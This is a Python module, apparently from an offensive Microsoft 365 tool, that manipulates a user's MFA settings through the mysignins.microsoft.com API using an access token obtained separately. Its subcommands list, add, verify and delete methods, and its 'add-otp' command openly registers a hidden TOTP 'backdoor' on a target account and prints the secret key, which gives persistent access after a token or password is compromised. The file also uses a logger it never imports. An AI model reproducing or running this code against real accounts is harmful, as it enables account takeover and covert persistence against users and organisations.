# msgraphx/modules/mfa/__init__.py
#
# MFA manipulation via mysignins.microsoft.com.
# Requires a token scoped to resource 19db86c3-b2b9-44cc-b339-36da233a3be2,
# passed via --mfa-token (separate from the main Graph token).

from __future__ import annotations

import argparse

# Local library imports
from ...core.context import GraphContext
from ...utils import output
from ...utils.console import console
from ...utils.errors import handle_graph_errors
from . import security_info


def add_arguments(parser: argparse.ArgumentParser, parents: list | None = None) -> None:
    parents = parents or []
    parser.add_argument(
        "--mfa-token",
        type=str,
        required=True,
        metavar="TOKEN",
        help=(
            "Access token for resource 19db86c3-b2b9-44cc-b339-36da233a3be2 "
            "(mysignins.microsoft.com). Obtain by refreshing with "
            "scope=19db86c3-b2b9-44cc-b339-36da233a3be2/.default."
        ),
    )
    subparsers = parser.add_subparsers(dest="mfa_subcommand", required=True)

    subparsers.add_parser("available", parents=parents, help="List registered MFA methods and available options.")

    otp_p = subparsers.add_parser("add-otp", parents=parents, help="Backdoor: register a hidden TOTP on the account.")

    phone_p = subparsers.add_parser("add-phone", parents=parents, help="Register a phone number as MFA.")
    phone_p.add_argument("--number", required=True, help="Phone number (digits only, e.g. 5551234567).")
    phone_p.add_argument("--country", default="1", help="Country code without + (default: 1).")
    phone_p.add_argument(
        "--type",
        dest="phone_type",
        choices=["sms", "call", "alt", "office"],
        default="sms",
        help="Phone method type (default: sms).",
    )

    email_p = subparsers.add_parser("add-email", parents=parents, help="Register an email address as MFA.")
    email_p.add_argument("--email", required=True, help="Email address to register.")

    verify_p = subparsers.add_parser("verify", parents=parents, help="Verify a pending MFA method addition.")
    verify_p.add_argument("--type", dest="info_type", type=int, required=True, help="Security info type integer.")
    verify_p.add_argument("--context", dest="verification_context", required=False, default=None)
    verify_p.add_argument("--data", dest="verification_data", required=True)

    delete_p = subparsers.add_parser("delete", parents=parents, help="Delete a registered MFA method.")
    delete_p.add_argument("--type", dest="info_type", type=int, required=True, help="Security info type integer.")
    delete_p.add_argument("--data", required=True, help="JSON data identifying the method to delete.")


@handle_graph_errors
async def run_with_arguments(context: GraphContext, args: argparse.Namespace) -> int:
    mfa_token: str = args.mfa_token
    sub = args.mfa_subcommand

    if sub == "available":
        methods = await security_info.available_methods(mfa_token)
        if context.json_output:
            output.print_json(methods)
            return 0
        if context.ndjson_output:
            for m in methods:
                output.print_ndjson_item(m)
            return 0
        for m in methods:
            console.print(f"  [bold]{m.get('method_name')}[/bold]  {m}")
        logger.success(f"{len(methods)} method(s) found.")
        return 0

    if sub == "add-otp":
        logger.info("Registering TOTP backdoor on the target account.")
        secret = await security_info.add_otp_backdoor(mfa_token)
        if secret:
            logger.success(f"TOTP backdoor registered. Secret key: {secret}")
            if context.json_output:
                output.print_json({"secret_key": secret})
            else:
                console.print(f"[bold green]Secret key:[/bold green] {secret}")
        return 0 if secret else 1

    if sub == "add-phone":
        result = await security_info.add_phone(mfa_token, args.country, args.number, args.phone_type)
        if context.json_output:
            output.print_json(result)
        else:
            console.print(result)
        return 0

    if sub == "add-email":
        result = await security_info.add_email(mfa_token, args.email)
        if context.json_output:
            output.print_json(result)
        else:
            console.print(result)
        return 0

    if sub == "verify":
        result = await security_info.verify(mfa_token, args.info_type, args.verification_context, args.verification_data)
        if context.json_output:
            output.print_json(result)
        else:
            console.print(result)
        return 0

    if sub == "delete":
        result = await security_info.delete(mfa_token, args.info_type, args.data)
        if context.json_output:
            output.print_json(result)
        else:
            deleted = result.get("Deleted", False)
            if deleted:
                logger.success("Method deleted successfully.")
            else:
                logger.error(f"Delete failed: {result}")
        return 0 if result.get("Deleted") else 1

    return 1
